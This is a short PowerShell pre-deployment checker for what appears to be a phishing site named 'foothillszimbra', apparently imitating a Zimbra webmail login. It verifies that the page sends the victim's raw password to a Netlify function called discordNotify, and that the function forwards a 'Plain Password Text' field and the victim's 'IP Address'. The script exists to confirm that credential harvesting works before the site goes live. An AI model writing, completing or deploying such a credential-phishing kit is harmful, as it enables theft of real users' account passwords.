$root = Split-Path -Parent $MyInvocation.MyCommand.Path
$expected = @(
    'index.html',
    'styles.css',
    'script.js',
    'netlify.toml',
    'netlify/functions/discordNotify.js'
)
$missing = @()
foreach ($item in $expected) {
    $path = Join-Path $root $item
    if (-not (Test-Path $path)) {
        $missing += $item
    }
}
if ($missing.Count -gt 0) {
    Write-Host "Missing files:" -ForegroundColor Red
    $missing | ForEach-Object { Write-Host " - $_" }
    exit 1
}

$script = Get-Content (Join-Path $root 'script.js') -Raw
$function = Get-Content (Join-Path $root 'netlify/functions/discordNotify.js') -Raw

$checks = @{}
$checks['script sends raw password'] = $script -match 'password:\s*passwordValue'
$checks['function reads body.password'] = $function -match 'body\.password'
$checks['function includes Plain Password Text field'] = $function -match 'Plain Password Text'
$checks['function includes IP Address field'] = $function -match 'IP Address'

$failed = $checks.GetEnumerator() | Where-Object { -not $_.Value }
if ($failed.Count -gt 0) {
    Write-Host "Validation failed:" -ForegroundColor Red
    foreach ($item in $failed) {
        Write-Host " - $($item.Key)"
    }
    exit 1
}

Write-Host "All deployment checks passed." -ForegroundColor Green
Write-Host "Folder: $root"
Write-Host "Ready to deploy 'foothillszimbra' or its ZIP file."
